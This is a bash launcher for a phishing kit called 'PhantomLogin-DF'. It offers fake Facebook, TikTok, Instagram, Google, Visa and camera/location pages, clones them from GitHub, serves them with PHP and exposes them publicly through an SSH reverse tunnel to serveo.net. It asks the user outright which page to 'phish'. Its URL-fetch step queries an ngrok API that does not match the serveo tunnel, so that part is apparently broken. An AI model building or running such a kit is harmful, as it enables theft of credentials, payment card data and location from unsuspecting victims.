#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

REPO_URL="https://github.com/MohamedAbuAl-Saud/PhantomLogin-DF.git"
REPO_DIR="PhantomLogin-DF"

show_banner() {
    clear
    echo -e "${BLUE}██████╗ ███████╗"
    echo -e "██╔══██╗██╔════╝"
    echo -e "██║  ██║█████╗"
    echo -e "██║  ██║██╔══╝"
    echo -e "██████╔╝██"
    echo -e "╚═════╝${NC}"
    echo -e "${YELLOW}-----------------------------------------------------------------------------------"
    echo -e "[+] Tool      : PhantomLogin-DF"
    echo -e "[+] Coder     : @A_Y_TR"
    echo -e "[+] Channel   : https://t.me/cybersecurityTemDF"
    echo -e "[+] Version   : 1.0"
    echo -e "-----------------------------------------------------------------------------------${NC}"
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin-DF${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${BLUE}1. Facebook login${NC}"
    echo -e "${BLUE}2. Tik tok login${NC}"
    echo -e "${BLUE}3. Instagram login${NC}"
    echo -e "${BLUE}4. Google login${NC}"
    echo -e "${BLUE}5. Visa login${NC}"
    echo -e "${BLUE}6. Camera and location${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

clone_repo() {
    if [[ -d "$REPO_DIR" ]]; then
        echo -e "${YELLOW}Repository already exists. Updating...${NC}"
        cd "$REPO_DIR" || { echo -e "${RED}Failed to enter repository directory.${NC}"; exit 1; }
        git pull origin main
        cd ..
    else
        echo -e "${GREEN}Cloning repository...${NC}"
        if ! git clone "$REPO_URL" "$REPO_DIR"; then
            echo -e "${RED}Failed to clone repository. Please check your internet connection.${NC}"
            exit 1
        fi
        echo -e "${GREEN}Repository cloned successfully.${NC}"
    fi
}

start_server() {
    echo -e "${GREEN}Starting PHP server...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${GREEN}PHP server started at http://localhost:3333/${page}.html${NC}"

    echo -e "${GREEN}Starting SSH tunnel...${NC}"
    ssh -R 80:localhost:3333 serveo.net > /dev/null 2>&1 &
    ssh_pid=$!
    sleep 5

    echo -e "${GREEN}Fetching Serveo URL...${NC}"
    serveo_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$serveo_url" ]]; then
        echo -e "${RED}Failed to start Serveo.net. Please make sure SSH is installed and try again.${NC}"
        exit 1
    fi

    echo -e "${GREEN}Serveo URL: ${serveo_url}/${page}.html${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop the server.${NC}"

    trap "kill $php_pid $ssh_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

show_banner

echo -e "${GREEN}Enter Token:${NC}"
read token
echo -e "${GREEN}Enter ID:${NC}"
read id

show_menu

echo -e "${GREEN}Choose the page you want to phish:${NC}"
read choice

case $choice in
    1)
        page="Facebook_login"
        ;;
    2)
        page="TikTok_login"
        ;;
    3)
        page="Instagram_login"
        ;;
    4)
        page="Google_login"
        ;;
    5)
        page="Visa_login"
        ;;
    6)
        page="CameraAndLocation_login"
        ;;
    *)
        echo -e "${RED}Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

clone_repo

if [[ ! -f "$REPO_DIR/${page}.html" ]]; then
    echo -e "${RED}File ${page}.html not found in the repository.${NC}"
    exit 1
fi

cp "$REPO_DIR/${page}.html" .

start_server
